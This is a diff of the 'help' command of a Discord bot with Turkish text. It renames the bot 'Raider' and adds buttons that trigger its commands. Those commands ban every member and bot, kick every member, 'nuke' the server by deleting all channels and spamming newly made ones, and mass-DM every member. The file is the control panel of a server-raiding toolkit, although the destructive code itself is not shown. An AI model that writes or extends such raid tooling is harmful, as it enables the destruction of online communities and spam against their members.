@@ -1,66 +1,87 @@
+const { MessageActionRow, MessageButton } = require("discord.js");
+
 module.exports = {
   name: "help",
-  description: "Tüm mevcut komutları göster",
+  description: "Tüm mevcut komutları göster (butonla komut çalıştırır)",
   async execute(message, args, client) {
     if (!message.guild) {
       return message.reply("Bu komut sadece sunucu içinde kullanılabilir!");
     }
 
+    // Embed mesaj
     const yardimEmbed = {
       color: 0xff0000,
-      title: "🔥 BOTORIA - Komut Listesi",
+      title: "Raider - Komut Paneli",
       description:
-        "Güçlü sunucu yönetim komutları - Sadece sunucu içinde çalışır",
-      fields: [
-        {
-          name: ".ban",
-          value: "Sunucudaki tüm üyeleri ve botları banla",
-          inline: false,
-        },
-        {
-          name: "👢 .kick",
-          value: "Sunucudaki tüm üyeleri at",
-          inline: false,
-        },
-        {
-          name: "💥 .nuke",
-          value:
-            "Tüm kanalları siler ve Yeni kanallar açar Açılan kanallara spam atar",
-          inline: false,
-        },
-        {
-          name: ".dm <mesaj>",
-          value: "Tüm üyelere mesaj gönder\nÖrnek: `.dm Merhaba herkese!`",
-          inline: false,
-        },
-        {
-          name: "❓ .help",
-          value: "Bu yardım mesajını göster",
-          inline: false,
-        },
-      ],
-      footer: {
-        text: "Zypheris.",
-      },
+        "Aşağıdaki butonlara tıklayarak komutları çalıştırabilirsin ⚙️\n\n⚠️ *Bazı komutlar tehlikeli olabilir!*",
+      footer: { text: "reallykrak." },
       timestamp: new Date(),
     };
 
-    try {
-      await message.reply({ embeds: [yardimEmbed] });
-    } catch (error) {
-      const yardimMetni = `🔥 **BOTORIA - Komut Listesi**
+    // Butonlar
+    const row = new MessageActionRow().addComponents(
+      new MessageButton()
+        .setCustomId("ban")
+        .setLabel("🔨 .ban")
+        .setStyle("DANGER"),
+      new MessageButton()
+        .setCustomId("kick")
+        .setLabel("👢 .kick")
+        .setStyle("DANGER"),
+      new MessageButton()
+        .setCustomId("nuke")
+        .setLabel("💥 .nuke")
+        .setStyle("DANGER"),
+      new MessageButton()
+        .setCustomId("dm")
+        .setLabel("📩 .dm")
+        .setStyle("PRIMARY")
+    );
 
- **.ban** - Tüm üyeleri ve botları banla
- **.kick** - Tüm üyeleri at  
- **.nuke** - Tüm kanalları sil ve spam yap
- **.dm <mesaj>** - Tüm üyelere DM gönder
-❓ **.help** - Bu yardımı göster
+    // Mesaj gönder
+    const sent = await message.reply({
+      embeds: [yardimEmbed],
+      components: [row],
+    });
 
-**Kullanım:** Sadece sunucu içinde çalışır!
+    // Filtre — sadece komutu yazan kişi butonları kullanabilsin
+    const filter = (i) => i.user.id === message.author.id;
+    const collector = sent.createMessageComponentCollector({
+      filter,
+      time: 60000,
+    });
 
-⚠️ **Uyarı:**Yaptığınız işlerden Botoria Development sorumlu değildir`;
+    collector.on("collect", async (interaction) => {
+      const id = interaction.customId;
 
-      message.reply(yardimMetni);
-    }
+      await interaction.deferReply({ ephemeral: true });
+
+      try {
+        // Butona göre komutu bul ve çalıştır
+        const cmd = client.commands.get(id);
+        if (!cmd) {
+          return interaction.editReply({
+            content: `❌ Komut bulunamadı: ${id}`,
+          });
+        }
+
+        // Komutu çalıştır
+        await cmd.execute(message, args, client);
+
+        await interaction.editReply({
+          content: `✅ **.${id}** komutu başarıyla çalıştırıldı!`,
+        });
+      } catch (err) {
+        console.error(err);
+        await interaction.editReply({
+          content: `⚠️ **.${id}** komutu çalıştırılırken bir hata oluştu.`,
+        });
+      }
+    });
+
+    collector.on("end", () => {
+      row.components.forEach((btn) => btn.setDisabled(true));
+      sent.edit({ components: [row] }).catch(() => {});
+    });
   },
 };
